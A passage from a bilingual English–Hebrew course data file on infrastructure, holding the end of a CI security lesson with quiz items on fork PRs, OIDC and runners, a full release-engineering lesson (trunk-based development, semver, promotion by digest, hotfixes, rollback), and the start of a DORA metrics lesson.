      a: { en: "You trust the vendor's intent, not the security of their account. Tags and branches are mutable pointers; whoever compromises the maintainer's token can move v4 to malicious code and you pull it on the next run — exactly what happened with tj-actions/changed-files in 2025. A full 40-char SHA is content-addressed and immutable. Updates come via Dependabot PRs you review.", he: "אתה סומך על הכוונות של הספק, לא על האבטחה של החשבון שלו. Tags ו-branches הם מצביעים שניתנים לשינוי; מי שפורץ ל-token של ה-maintainer יכול להזיז את v4 לקוד זדוני ואתה מושך אותו בריצה הבאה — בדיוק מה שקרה עם tj-actions/changed-files ב-2025. SHA מלא של 40 תווים הוא content-addressed ולא ניתן לשינוי. עדכונים מגיעים דרך PR-ים של Dependabot שאתה עובר עליהם." }
    }
  ],
  quiz: [
    {
      q: { en: "A fork PR triggers a workflow on pull_request (not _target). What does the job get?", he: "PR מ-fork מפעיל workflow על pull_request (לא _target). מה ה-job מקבל?" },
      options: [
        { en: "All repo secrets and a write token", he: "את כל ה-secrets של ה-repo ו-token עם הרשאות כתיבה" },
        { en: "No secrets and a read-only GITHUB_TOKEN", he: "בלי secrets ו-GITHUB_TOKEN שהוא read-only" },
        { en: "Secrets, but only environment secrets", he: "Secrets, אבל רק של environments" },
        { en: "Nothing — fork PRs never run workflows", he: "כלום — PR-ים מ-fork אף פעם לא מריצים workflows" }
      ],
      answer: 1,
      explain: { en: "Fork PRs run the untrusted PR code, so GitHub withholds secrets and downgrades the token to read-only. pull_request_target is the variant that runs the base workflow with secrets.", he: "PR-ים מ-fork מריצים קוד לא אמין, אז GitHub לא מעביר secrets ומוריד את ה-token ל-read-only. pull_request_target הוא הווריאנט שמריץ את ה-workflow של ה-base עם secrets." }
    },
    {
      q: { en: "Which OIDC trust condition is safest for a prod deploy role?", he: "איזה condition ב-trust של OIDC הכי בטוח ל-role של deploy לפרוד?" },
      options: [
        { en: "StringLike sub: repo:acme/*", he: "StringLike על sub: repo:acme/*" },
        { en: "Only aud = sts.amazonaws.com", he: "רק aud = sts.amazonaws.com" },
        { en: "StringEquals sub: repo:acme/api:environment:production plus aud check", he: "StringEquals על sub: repo:acme/api:environment:production יחד עם בדיקת aud" },
        { en: "StringEquals sub: repo:acme/api:pull_request", he: "StringEquals על sub: repo:acme/api:pull_request" }
      ],
      answer: 2,
      explain: { en: "Pin one repo and the protected environment, so only jobs that passed the environment's reviewers and branch rules get prod credentials. Wildcards or aud-only checks let other repos (or any workflow) assume it.", he: "נועלים repo אחד והסביבה המוגנת, כך שרק jobs שעברו את ה-reviewers וכללי ה-branch של הסביבה מקבלים credentials לפרוד. Wildcard או בדיקה של aud בלבד מאפשרים ל-repos אחרים (או לכל workflow) לקבל אותו." }
    },
    {
      q: { en: "What does concurrency: { group: deploy-production, cancel-in-progress: false } do when three deploys are triggered quickly?", he: "מה עושה concurrency: { group: deploy-production, cancel-in-progress: false } כששלושה deploys מופעלים מהר אחד אחרי השני?" },
      options: [
        { en: "Runs all three in parallel", he: "מריץ את שלושתם במקביל" },
        { en: "Cancels the running deploy and starts the newest", he: "מבטל את ה-deploy שרץ ומתחיל את החדש ביותר" },
        { en: "The first runs; the second is pending until the third replaces it; then the third runs", he: "הראשון רץ; השני ממתין עד שהשלישי מחליף אותו; ואז השלישי רץ" },
        { en: "Fails the second and third runs", he: "מכשיל את הריצה השנייה והשלישית" }
      ],
      answer: 2,
      explain: { en: "A concurrency group allows one running and one pending run. A newer pending run replaces the older pending one; with cancel-in-progress false the running deploy is never interrupted.", he: "Concurrency group מאפשר ריצה אחת שרצה ואחת שממתינה. ריצה ממתינה חדשה מחליפה את הממתינה הישנה; עם cancel-in-progress false ה-deploy שרץ אף פעם לא נקטע." }
    },
    {
      q: { en: "Why are persistent self-hosted runners dangerous even on a private repo?", he: "למה self-hosted runners קבועים מסוכנים גם ב-repo פרטי?" },
      options: [
        { en: "They are slower than hosted runners", he: "הם איטיים יותר מ-runners מסוג hosted" },
        { en: "A job can leave files or processes behind that tamper with or read later jobs, including prod deploys", he: "Job יכול להשאיר קבצים או תהליכים שמשבשים או קוראים jobs מאוחרים יותר, כולל deploys לפרוד" },
        { en: "GitHub bills them double", he: "GitHub מחייב עליהם כפול" },
        { en: "They cannot use OIDC", he: "הם לא יכולים להשתמש ב-OIDC" }
      ],
      answer: 1,
      explain: { en: "State survives between jobs: poisoned caches, modified tool binaries, background processes. Ephemeral runners (one job then destroy, e.g. ARC) remove the cross-job channel.", he: "State שורד בין jobs: caches מורעלים, בינארים של כלים ששונו, תהליכים ברקע. Runners מסוג ephemeral (job אחד ואז השמדה, למשל עם ARC) מבטלים את הערוץ בין jobs." }
    }
  ],
  related: ["cloud-cicd", "staff-supply-chain", "cloud-secrets-management", "cloud-iam-security", "staff-zero-trust-secrets"]
});

/* ------------------------------------------------------------------ 2. Release engineering */
window.INFRA.lessons.push({
  id: "release-engineering",
  track: "cloud",
  order: 61,
  icon: "🏷️",
  level: 2,
  minutes: 15,
  title: { en: "Release Engineering", he: "Release Engineering – איך משחררים גרסאות" },
  tldr: {
    en: "Integrate on trunk, version with semver derived from conventional commits, build one immutable artifact and promote it by digest through environments, and decide per change whether to roll back or roll forward — the release process should be boring and reversible.",
    he: "עושים integration על trunk, נותנים גרסאות לפי semver שנגזרות מ-conventional commits, בונים artifact אחד immutable ומקדמים אותו לפי digest בין הסביבות, ומחליטים לכל שינוי אם עושים rollback או roll-forward — תהליך השחרור צריך להיות משעמם והפיך."
  },
  analogy: {
    en: "Think of a train station. Continuous deployment is a tram that leaves whenever a passenger boards; a release train leaves every two weeks at 09:00 sharp — if your change misses it, it takes the next one, the train never waits. Build once, promote many is putting the passenger in one sealed carriage: the same carriage rolls through every station, you only change the destination sign.",
    he: "תחשוב על תחנת רכבת. Continuous deployment זה רכבת קלה שיוצאת בכל פעם שעולה נוסע; release train יוצאת כל שבועיים ב-09:00 בדיוק — אם השינוי שלך פספס אותה, הוא עולה על הבאה, הרכבת לא מחכה. Build once, promote many זה לשים את הנוסע בקרון אחד אטום: אותו קרון עובר בכל התחנות, ומחליפים רק את שלט היעד."
  },
  sections: [
    {
      h: { en: "Branching: trunk-based vs GitFlow", he: "Branching: trunk-based מול GitFlow" },
      body: {
        en: `<p><strong>GitFlow</strong> (2010) uses long-lived <code>develop</code> and <code>main</code>, plus <code>feature/*</code>, <code>release/*</code> and <code>hotfix/*</code> branches. It fits software shipped as discrete versions that you support in parallel (an on-prem product with v3 and v4 in the field). For a SaaS deploying daily it is pure overhead: features sit for weeks on branches, merges are big and painful, and "what is in prod" requires archaeology. Its own author added a note in 2020 recommending simpler flows for continuously delivered software.</p>
<p><strong>Trunk-based development</strong>: everyone merges small changes into <code>main</code> at least daily; branches live hours, not weeks. Unfinished work hides behind <strong>feature flags</strong>, not branches. DORA research consistently links trunk-based development (≤3 active branches, merging at least daily, no code freezes) with higher delivery performance.</p>
<table>
<tr><th></th><th>Trunk-based</th><th>GitFlow</th></tr>
<tr><td>Branch lifetime</td><td>hours to 1-2 days</td><td>days to weeks</td></tr>
<tr><td>Release unit</td><td>any green commit on main</td><td><code>release/x.y</code> branch</td></tr>
<tr><td>Incomplete features</td><td>feature flags</td><td>long feature branches</td></tr>
<tr><td>Fits</td><td>SaaS, services, continuous delivery</td><td>versioned products with parallel support</td></tr>
</table>
<p>A useful middle ground for products: trunk-based development <em>plus</em> short-lived release branches cut from main (<code>release/2.3</code>) that only receive cherry-picked fixes.</p>
<blockquote>💡 Real world: at scale, trunk-based needs a <strong>merge queue</strong> (GitHub merge queue, Bors, Mergify): PRs are tested against the latest main plus the PRs ahead of them, so two green PRs can't combine into a red main.</blockquote>`,
        he: `<p><strong>GitFlow</strong> (2010) משתמש ב-<code>develop</code> ו-<code>main</code> שחיים לאורך זמן, ועוד branches של <code>feature/*</code>, <code>release/*</code> ו-<code>hotfix/*</code>. הוא מתאים לתוכנה שמשוחררת בגרסאות נפרדות שתומכים בהן במקביל (מוצר on-prem עם v3 ו-v4 אצל לקוחות). ל-SaaS שעושה deploy כל יום זה overhead נטו: features יושבים שבועות על branches, ה-merges גדולים וכואבים, ולהבין "מה רץ בפרוד" דורש ארכיאולוגיה. הכותב המקורי בעצמו הוסיף ב-2020 הערה שממליצה על flows פשוטים יותר לתוכנה שמשוחררת ברציפות.</p>
<p><strong>Trunk-based development</strong>: כולם עושים merge לשינויים קטנים ל-<code>main</code> לפחות פעם ביום; branches חיים שעות, לא שבועות. עבודה לא גמורה מוסתרת מאחורי <strong>feature flags</strong>, לא מאחורי branches. מחקרי DORA מקשרים שוב ושוב trunk-based development (עד 3 branches פעילים, merge לפחות פעם ביום, בלי code freezes) עם ביצועי delivery גבוהים יותר.</p>
<table>
<tr><th></th><th>Trunk-based</th><th>GitFlow</th></tr>
<tr><td>אורך חיים של branch</td><td>שעות עד יום-יומיים</td><td>ימים עד שבועות</td></tr>
<tr><td>יחידת שחרור</td><td>כל commit ירוק על main</td><td>branch של <code>release/x.y</code></td></tr>
<tr><td>Features לא גמורים</td><td>feature flags</td><td>feature branches ארוכים</td></tr>
<tr><td>מתאים ל</td><td>SaaS, שירותים, continuous delivery</td><td>מוצרים עם גרסאות ותמיכה מקבילה</td></tr>
</table>
<p>דרך ביניים שימושית למוצרים: trunk-based development <em>ועוד</em> release branches קצרים שנחתכים מ-main (<code>release/2.3</code>) ומקבלים רק תיקונים ב-cherry-pick.</p>
<blockquote>💡 Real world: בסקייל, trunk-based צריך <strong>merge queue</strong> (GitHub merge queue, Bors, Mergify): כל PR נבדק מול ה-main העדכני ועוד ה-PR-ים שלפניו בתור, כך ששני PR-ים ירוקים לא יכולים להתחבר ל-main אדום.</blockquote>`
      }
    },
    {
      h: { en: "Semver, conventional commits and changelogs", he: "Semver, conventional commits ו-changelogs" },
      body: {
        en: `<p><strong>Semantic Versioning</strong>: <code>MAJOR.MINOR.PATCH</code>. MAJOR = breaking change, MINOR = backwards-compatible feature, PATCH = backwards-compatible fix. Pre-releases sort before the release: <code>2.0.0-rc.1 &lt; 2.0.0</code>. Anything in <code>0.y.z</code> may break at any time — which is why consumers of a <code>0.x</code> library pin exactly.</p>
<p><strong>Conventional Commits</strong> make the version computable from history:</p>
<pre>fix(api): return 404 instead of 500 for unknown order      -&gt; PATCH
feat(api): add ?status filter to GET /orders                -&gt; MINOR
feat(api)!: remove deprecated /v1/orders endpoint           -&gt; MAJOR

BREAKING CHANGE: clients must migrate to /v2/orders         (footer also -&gt; MAJOR)</pre>
<p>Tools turn this into tags and changelogs: <strong>release-please</strong> (opens a standing "Release PR" that accumulates the changelog; merging it tags and creates the GitHub release), <strong>semantic-release</strong> (fully automatic on every merge), <strong>Changesets</strong> (great for JS monorepos with many packages), <strong>git-cliff</strong> (changelog only). Enforce the format with a commitlint check on the PR title when you squash-merge.</p>
<blockquote>⚠️ Production tip: a changelog is for humans, not a <code>git log</code> dump. Group by Features / Fixes / Breaking, link PRs, and write the breaking-change section as a migration guide. Generated is fine; unedited noise is not.</blockquote>`,
        he: `<p><strong>Semantic Versioning</strong>: <code>MAJOR.MINOR.PATCH</code>. MAJOR = שינוי שובר, MINOR = feature תואם לאחור, PATCH = תיקון תואם לאחור. גרסאות pre-release ממוינות לפני הגרסה עצמה: <code>2.0.0-rc.1 &lt; 2.0.0</code>. כל דבר ב-<code>0.y.z</code> יכול להישבר בכל רגע — ולכן מי שצורך ספרייה בגרסה <code>0.x</code> נועל גרסה מדויקת.</p>
<p><strong>Conventional Commits</strong> הופכים את הגרסה לדבר שאפשר לחשב מההיסטוריה:</p>
<pre>fix(api): return 404 instead of 500 for unknown order      -&gt; PATCH
feat(api): add ?status filter to GET /orders                -&gt; MINOR
feat(api)!: remove deprecated /v1/orders endpoint           -&gt; MAJOR

BREAKING CHANGE: clients must migrate to /v2/orders         (footer also -&gt; MAJOR)</pre>
<p>כלים הופכים את זה ל-tags ו-changelogs: <strong>release-please</strong> (פותח "Release PR" קבוע שצובר את ה-changelog; merge שלו יוצר tag ו-GitHub release), <strong>semantic-release</strong> (אוטומטי לגמרי בכל merge), <strong>Changesets</strong> (מצוין ל-monorepos של JS עם הרבה packages), <strong>git-cliff</strong> (רק changelog). אוכפים את הפורמט עם בדיקת commitlint על כותרת ה-PR כשעושים squash-merge.</p>
<blockquote>⚠️ Production tip: changelog נכתב לבני אדם, הוא לא dump של <code>git log</code>. מקבצים לפי Features / Fixes / Breaking, מקשרים ל-PR-ים, וכותבים את החלק של השינויים השוברים כמדריך מיגרציה. לייצר אותו אוטומטית זה בסדר; רעש שאף אחד לא ערך — לא.</blockquote>`
      }
    },
    {
      h: { en: "Build once, promote many — by digest", he: "Build once, promote many — לפי digest" },
      body: {
        en: `<p>Rebuilding per environment means staging tested different bytes than prod runs (a new base image, a floating dependency). Build <strong>once</strong>, sign it, then promote the <em>same digest</em>:</p>
<pre># CI on main: build, push, sign, record the digest
docker buildx build --push -t ghcr.io/acme/api:sha-3f2a9c1 .
DIGEST=$(crane digest ghcr.io/acme/api:sha-3f2a9c1)     # sha256:9b1e...
cosign sign --yes ghcr.io/acme/api@$DIGEST

# promote = a pointer move, not a rebuild
crane tag ghcr.io/acme/api@$DIGEST staging
# ...after staging tests + soak:
crane copy ghcr.io/acme/api@$DIGEST registry.prod.acme.io/api@$DIGEST   # separate prod registry
</pre>
<p>In GitOps, promotion is a PR that changes one line in the environment's overlay:</p>
<pre># envs/prod/kustomization.yaml
images:
  - name: ghcr.io/acme/api
    digest: sha256:9b1e4c...        # same digest staging ran for 24h</pre>
<p>Config differs per environment (replica counts, URLs, secrets references); the artifact does not. Tools like Kargo, Argo CD Image Updater or a simple "promote" workflow automate the PR, and admission policies (Kyverno, Sigstore policy-controller) can require that the prod digest carries a signature and an attestation from the staging test stage.</p>
<blockquote>💡 Real world: tag images with the git SHA for humans (<code>sha-3f2a9c1</code>) but deploy by digest. A tag can be moved by anyone with push rights; a digest is the content itself.</blockquote>`,
        he: `<p>בנייה מחדש לכל סביבה אומרת ש-staging בדק בייטים אחרים ממה שרץ בפרוד (base image חדש, dependency שזז). בונים <strong>פעם אחת</strong>, חותמים, ואז מקדמים את <em>אותו digest</em>:</p>
<pre># CI on main: build, push, sign, record the digest
docker buildx build --push -t ghcr.io/acme/api:sha-3f2a9c1 .
DIGEST=$(crane digest ghcr.io/acme/api:sha-3f2a9c1)     # sha256:9b1e...
cosign sign --yes ghcr.io/acme/api@$DIGEST

# promote = a pointer move, not a rebuild
crane tag ghcr.io/acme/api@$DIGEST staging
# ...after staging tests + soak:
crane copy ghcr.io/acme/api@$DIGEST registry.prod.acme.io/api@$DIGEST   # separate prod registry
</pre>
<p>ב-GitOps, promotion זה PR שמשנה שורה אחת ב-overlay של הסביבה:</p>
<pre># envs/prod/kustomization.yaml
images:
  - name: ghcr.io/acme/api
    digest: sha256:9b1e4c...        # same digest staging ran for 24h</pre>
<p>ה-config שונה בין סביבות (מספר replicas, כתובות, הפניות ל-secrets); ה-artifact לא. כלים כמו Kargo, Argo CD Image Updater או workflow פשוט של "promote" עושים אוטומציה ל-PR, ו-admission policies (Kyverno, Sigstore policy-controller) יכולים לחייב שה-digest בפרוד נושא חתימה ו-attestation משלב הטסטים של staging.</p>
<blockquote>💡 Real world: תתייג images לפי git SHA בשביל בני אדם (<code>sha-3f2a9c1</code>) אבל תעשה deploy לפי digest. Tag כל מי שיש לו הרשאת push יכול להזיז; digest הוא התוכן עצמו.</blockquote>`
      }
    },
    {
      h: { en: "Release trains vs continuous deploy, and versioning APIs", he: "Release trains מול continuous deploy, וגרסאות ל-APIs" },
      body: {
        en: `<p><strong>Continuous deployment</strong>: every merge that passes gates reaches prod, typically within an hour. Best for services you fully control. <strong>Release trains</strong>: a fixed schedule (weekly, biweekly, every 4 weeks like Chrome since 2021). Whatever is merged and flagged-ready by the cut-off boards; nothing waits for a late feature. Trains suit products where each release has a cost per release (app store review, customer upgrade, on-prem installs, regulated sign-off).</p>
<p><strong>Versioning a service API</strong> is different from versioning the service: deploy 50 times a day but keep the contract stable. Additive changes (new optional field, new endpoint) need no new version. Breaking changes go through <strong>expand → migrate → contract</strong>: add v2, run both, measure v1 traffic per client, announce with <code>Deprecation</code> and <code>Sunset</code> headers, remove when traffic hits zero (or the date passes). Kubernetes is the model: a GA API version is supported for at least 12 months or 3 releases after deprecation.</p>
<p><strong>Libraries</strong>: deprecate in a MINOR (warning + replacement), remove only in the next MAJOR, and publish a migration guide. Breaking a library is cheap for you and expensive for every consumer — Hyrum's law says someone depends on your observable behavior, documented or not.</p>
<p><strong>Mobile and desktop</strong> are where "rollback" stops existing: once v5.2 is on a phone, you cannot pull it back. So: staged rollouts (Google Play percentage rollouts; App Store phased release over 7 days: 1%, 2%, 5%, 10%, 20%, 50%, 100%, which you can pause), kill switches and remote config served by your backend, a server-enforced minimum supported version for forced upgrades, and APIs that tolerate clients several versions old for months. Desktop apps add code signing, macOS notarization and auto-update channels (stable/beta) via frameworks like Sparkle or Squirrel.</p>`,
        he: `<p><strong>Continuous deployment</strong>: כל merge שעובר את ה-gates מגיע לפרוד, בדרך כלל תוך שעה. הכי מתאים לשירותים שבשליטה מלאה שלך. <strong>Release trains</strong>: לוח זמנים קבוע (שבועי, דו-שבועי, כל 4 שבועות כמו Chrome מאז 2021). מה שעבר merge וסומן מוכן מאחורי flag עד ה-cut-off עולה לרכבת; כלום לא מחכה ל-feature שמאחר. רכבות מתאימות למוצרים שבהם לכל שחרור יש עלות (review של app store, שדרוג אצל הלקוח, התקנות on-prem, אישור רגולטורי).</p>
<p><strong>גרסאות ל-API של שירות</strong> זה לא אותו דבר כמו גרסאות לשירות עצמו: עושים deploy 50 פעם ביום אבל שומרים על החוזה יציב. שינויים מוסיפים (שדה אופציונלי חדש, endpoint חדש) לא צריכים גרסה חדשה. שינויים שוברים עוברים <strong>expand → migrate → contract</strong>: מוסיפים v2, מריצים את שתיהן, מודדים את התעבורה ל-v1 לפי client, מודיעים עם headers של <code>Deprecation</code> ו-<code>Sunset</code>, ומסירים כשהתעבורה מגיעה לאפס (או כשהתאריך עובר). Kubernetes הוא המודל: גרסת API ב-GA נתמכת לפחות 12 חודשים או 3 releases אחרי ה-deprecation.</p>
<p><strong>ספריות</strong>: עושים deprecation ב-MINOR (אזהרה + תחליף), מסירים רק ב-MAJOR הבא, ומפרסמים מדריך מיגרציה. לשבור ספרייה זה זול לך ויקר לכל מי שצורך אותה — Hyrum's law אומר שמישהו תלוי בכל התנהגות שאפשר לראות, מתועדת או לא.</p>
<p><strong>Mobile ו-desktop</strong> זה המקום שבו "rollback" מפסיק להתקיים: ברגע ש-v5.2 על טלפון, אי אפשר למשוך אותה חזרה. לכן: staged rollouts (אחוזי rollout ב-Google Play; ב-App Store יש phased release על פני 7 ימים: 1%, 2%, 5%, 10%, 20%, 50%, 100%, שאפשר לעצור), kill switches ו-remote config שמגיעים מה-backend שלך, גרסה מינימלית נתמכת שנאכפת בשרת בשביל forced upgrade, ו-APIs שסובלים clients ישנים בכמה גרסאות במשך חודשים. אפליקציות desktop מוסיפות code signing, notarization ב-macOS וערוצי auto-update (stable/beta) דרך frameworks כמו Sparkle או Squirrel.</p>`
      }
    },
    {
      h: { en: "Hotfixes, rollback vs roll-forward", he: "Hotfixes, rollback מול roll-forward" },
      body: {
        en: `<p><strong>Hotfix flow on trunk-based</strong>: fix lands on <code>main</code> first (so it can never be forgotten in the next release), then is cherry-picked to the release branch if one exists:</p>
<pre>git switch main &amp;&amp; git pull
# PR "fix(payments): guard null currency" merged as 7c1d2e4
git switch release/2.3
git cherry-pick -x 7c1d2e4          # -x records the origin commit in the message
git tag -s v2.3.1 -m "v2.3.1: guard null currency"
git push origin release/2.3 v2.3.1</pre>
<p>A hotfix uses the <em>same</em> pipeline with the same gates — maybe a shorter soak, never a manual <code>scp</code> to prod. If your normal pipeline is too slow for an emergency, that is the thing to fix.</p>
<p><strong>Rollback vs roll-forward</strong> (deeper in <code>rel-deployments</code>): roll back when the previous artifact is known-good and the change is reversible — it is the fastest mitigation, typically minutes (<code>argo rollouts undo</code>, revert the GitOps commit). Roll forward when going back is unsafe: a DB migration already dropped a column, a message format was already consumed downstream, or the fix is one line and the pipeline takes 10 minutes. The design rule that keeps rollback always available: <strong>decouple deploy from release</strong> (flags), and make schema changes expand/contract so version N-1 still runs against the new schema.</p>
<blockquote>⚠️ Production tip: decide the rollback plan <em>before</em> the deploy and write it in the PR ("rollback = revert; migration 0042 is additive"). At 03:00 nobody should be discovering that the previous image can't read the new data.</blockquote>`,
        he: `<p><strong>Hotfix ב-trunk-based</strong>: התיקון נכנס קודם ל-<code>main</code> (כדי שאי אפשר יהיה לשכוח אותו ב-release הבא), ואז עובר cherry-pick ל-release branch אם יש כזה:</p>
<pre>git switch main &amp;&amp; git pull
# PR "fix(payments): guard null currency" merged as 7c1d2e4
git switch release/2.3
git cherry-pick -x 7c1d2e4          # -x records the origin commit in the message
git tag -s v2.3.1 -m "v2.3.1: guard null currency"
git push origin release/2.3 v2.3.1</pre>
<p>Hotfix עובר ב-<em>אותו</em> pipeline עם אותם gates — אולי soak קצר יותר, אף פעם לא <code>scp</code> ידני לפרוד. אם ה-pipeline הרגיל שלך איטי מדי בשביל מקרה חירום, זה בדיוק מה שצריך לתקן.</p>
<p><strong>Rollback מול roll-forward</strong> (בהרחבה ב-<code>rel-deployments</code>): עושים rollback כשה-artifact הקודם ידוע כתקין והשינוי הפיך — זה ה-mitigation הכי מהיר, בדרך כלל דקות (<code>argo rollouts undo</code>, revert ל-commit של GitOps). עושים roll-forward כשלחזור אחורה לא בטוח: migration ל-DB כבר מחקה עמודה, פורמט הודעה כבר נצרך downstream, או שהתיקון הוא שורה אחת וה-pipeline לוקח 10 דקות. כלל התכנון ששומר על rollback תמיד אפשרי: <strong>להפריד deploy מ-release</strong> (flags), ולעשות שינויי schema בשיטת expand/contract כך שגרסה N-1 עדיין רצה מול ה-schema החדש.</p>
<blockquote>⚠️ Production tip: תחליט על תוכנית ה-rollback <em>לפני</em> ה-deploy ותכתוב אותה ב-PR ("rollback = revert; migration 0042 is additive"). ב-03:00 אף אחד לא אמור לגלות שה-image הקודם לא יודע לקרוא את הדאטה החדש.</blockquote>`
      }
    }
  ],
  diagram: "main --(merge, CI)--> build once --> ghcr.io/acme/api@sha256:9b1e (signed)\n                                   |\n            dev  <-- promote digest -+\n            staging <-- same digest (tests + 24h soak, attestation)\n            prod <-- same digest (canary 5% -> 100%)\nrelease/2.3 <-- cherry-pick -x fixes --> tag v2.3.1",
  handsOn: [
    { cmd: "git log --oneline v2.3.0..HEAD | grep -E '^[0-9a-f]+ (feat|fix)(\\(.+\\))?!?:'", what: { en: "List conventional commits since the last tag — the input for the next version bump and changelog.", he: "להציג את ה-conventional commits מאז ה-tag האחרון — הקלט להעלאת הגרסה הבאה ול-changelog." } },
    { cmd: "crane digest ghcr.io/acme/api:sha-3f2a9c1", what: { en: "Resolve a tag to its immutable digest before promoting it.", he: "לתרגם tag ל-digest הקבוע שלו לפני שמקדמים אותו." } },
    { cmd: "kubectl get deploy api -n prod -o jsonpath='{.spec.template.spec.containers[0].image}'", what: { en: "Verify prod runs an image pinned by digest, not a mutable tag.", he: "לוודא שפרוד מריץ image שנעול לפי digest, לא tag שניתן לשינוי." } },
    { cmd: "npx release-please release-pr --repo-url=acme/api --token=$GITHUB_TOKEN --dry-run", what: { en: "Preview the version bump and changelog release-please would propose.", he: "לראות מראש את העלאת הגרסה וה-changelog ש-release-please היה מציע." } }
  ],
  mnemonic: {
    en: "Small on trunk, versions from commits, one digest everywhere, rollback planned before deploy.",
    he: "קטן על trunk, גרסאות מתוך commits, digest אחד בכל מקום, ותוכנית rollback לפני ה-deploy."
  },
  pitfalls: [
    { en: "Rebuilding the image for prod 'from the same commit'. Base images and unpinned dependencies move; you ship bytes that were never tested.", he: "לבנות מחדש את ה-image לפרוד 'מאותו commit'. Base images ו-dependencies לא נעולים זזים; אתה משחרר בייטים שאף אחד לא בדק." },
    { en: "Hotfixing only the release branch. The next release from main re-introduces the bug. Fix on main first, cherry-pick down.", he: "לעשות hotfix רק על ה-release branch. ה-release הבא מ-main מחזיר את הבאג. מתקנים קודם על main ועושים cherry-pick למטה." },
    { en: "Calling every API change 'v2'. Additive changes need no version; a new major API version doubles your maintenance for years.", he: "לקרוא לכל שינוי ב-API בשם 'v2'. שינויים מוסיפים לא צריכים גרסה; גרסת API major חדשה מכפילה את התחזוקה שלך לשנים." },
    { en: "Shipping a mobile release that depends on a backend change deployed the same day — old clients stay in the field for months, so the backend must support both.", he: "לשחרר גרסת mobile שתלויה בשינוי backend שנפרס באותו יום — clients ישנים נשארים בשטח חודשים, אז ה-backend חייב לתמוך בשניהם." }
  ],
  interview: [
    {
      q: { en: "Your team uses GitFlow and releases monthly with painful merges. How would you move to trunk-based?", he: "הצוות שלך עובד עם GitFlow ומשחרר פעם בחודש עם merges כואבים. איך היית עובר ל-trunk-based?" },
      a: { en: "First make main always releasable: fast CI (<10 min), required checks, a merge queue. Introduce feature flags so incomplete work can merge. Set a branch-lifetime norm (<2 days) and track it. Drop develop; cut short release branches from main only if we still need versioned releases. Automate versioning with conventional commits. Measure lead time and merge frequency before and after to show the effect.", he: "קודם להפוך את main לתמיד-ניתן-לשחרור: CI מהיר (פחות מ-10 דקות), checks חובה, merge queue. להכניס feature flags כדי שעבודה לא גמורה תוכל לעשות merge. לקבוע נורמה לאורך חיים של branch (פחות מיומיים) ולמדוד אותה. לוותר על develop; לחתוך release branches קצרים מ-main רק אם עדיין צריך releases עם גרסאות. לעשות אוטומציה לגרסאות עם conventional commits. למדוד lead time ותדירות merge לפני ואחרי כדי להראות את ההשפעה." }
    },
    {
      q: { en: "When is roll-forward the right call over rollback?", he: "מתי roll-forward עדיף על rollback?" },
      a: { en: "When reverting is unsafe or slower: an irreversible migration already ran, data in a new format was written and old code can't read it, or downstream consumers already depend on the new behavior. Also when the fix is trivial and the pipeline is fast. Otherwise rollback first to restore service, then debug calmly.", he: "כשלחזור אחורה לא בטוח או איטי יותר: migration בלתי הפיך כבר רץ, דאטה נכתב בפורמט חדש שהקוד הישן לא יודע לקרוא, או ש-consumers downstream כבר תלויים בהתנהגות החדשה. וגם כשהתיקון טריוויאלי וה-pipeline מהיר. בכל מקרה אחר — קודם rollback כדי להחזיר את השירות, ואז לדבג בשקט." }
    }
  ],
  quiz: [
    {
      q: { en: "Which commit produces a MAJOR bump under Conventional Commits?", he: "איזה commit גורם להעלאת MAJOR לפי Conventional Commits?" },
      options: [
        { en: "fix(api): handle timeout", he: "fix(api): handle timeout" },
        { en: "feat(api): add pagination", he: "feat(api): add pagination" },
        { en: "feat(api)!: drop XML responses", he: "feat(api)!: drop XML responses" },
        { en: "chore: bump deps", he: "chore: bump deps" }
      ],
      answer: 2,
      explain: { en: "The ! after the type/scope (or a BREAKING CHANGE: footer) marks a breaking change → MAJOR. feat → MINOR, fix → PATCH, chore → no release.", he: "ה-! אחרי ה-type/scope (או footer של BREAKING CHANGE:) מסמן שינוי שובר → MAJOR. feat → MINOR, fix → PATCH, chore → בלי release." }
    },
    {
      q: { en: "What does 'build once, promote many' require at promotion time?", he: "מה 'build once, promote many' דורש בזמן ה-promotion?" },
      options: [
        { en: "Rebuild from the same git SHA with a prod flag", he: "לבנות מחדש מאותו git SHA עם flag של פרוד" },
        { en: "Deploy the identical image digest that passed the earlier stage; only config differs", he: "לפרוס את אותו image digest בדיוק שעבר את השלב הקודם; רק ה-config שונה" },
        { en: "Retag :latest to point at the new build", he: "להזיז את :latest כדי שיצביע על ה-build החדש" },
        { en: "Copy the source code to the prod cluster", he: "להעתיק את קוד המקור ל-cluster של פרוד" }
      ],
      answer: 1,
      explain: { en: "Promotion moves a pointer to the same content-addressed artifact. Rebuilding or floating tags breaks the guarantee that prod runs what staging tested.", he: "Promotion מזיז מצביע לאותו artifact שמזוהה לפי תוכן. בנייה מחדש או tags צפים שוברים את ההבטחה שפרוד מריץ את מה ש-staging בדק." }
    },
    {
      q: { en: "Why can't a mobile team rely on rollback the way a backend team does?", he: "למה צוות mobile לא יכול לסמוך על rollback כמו צוות backend?" },
      options: [
        { en: "App stores forbid version numbers going down", he: "חנויות האפליקציות אוסרות להוריד מספר גרסה" },
        { en: "Installed binaries stay on users' devices; you can only pause rollout, flip remote flags, or ship a new version", he: "בינארים שהותקנו נשארים על המכשירים; אפשר רק לעצור rollout, להחליף flags מרחוק או לשחרר גרסה חדשה" },
        { en: "Mobile apps have no versions", he: "לאפליקציות mobile אין גרסאות" },
        { en: "Rollback is possible but costs money", he: "Rollback אפשרי אבל עולה כסף" }
      ],
      answer: 1,
      explain: { en: "Once installed, a version is out of your control. Mitigations are staged/phased rollout pauses, server-side kill switches and remote config, and forced upgrade via a minimum supported version.", he: "ברגע שגרסה הותקנה, היא מחוץ לשליטה שלך. ה-mitigations הם עצירה של staged/phased rollout, kill switches ו-remote config בצד השרת, ו-forced upgrade דרך גרסה מינימלית נתמכת." }
    }
  ],
  related: ["cloud-cicd", "rel-deployments", "arch-feature-flags", "k8s-argo-rollouts", "staff-supply-chain"]
});

/* ------------------------------------------------------------------ 3. DORA metrics */
window.INFRA.lessons.push({
  id: "dora-metrics",
  track: "cloud",
  order: 62,
  icon: "📈",
  level: 2,
  minutes: 14,
  title: { en: "Measuring Delivery: DORA, SPACE and DevEx", he: "מדידת delivery: DORA, SPACE ו-DevEx" },
  tldr: {
    en: "DORA's keys measure throughput (deployment frequency, lead time) and stability (change failure rate, recovery time, rework rate) together; compute them from git, CI/CD and incident data, use them to find bottlenecks, and never turn them into individual targets.",
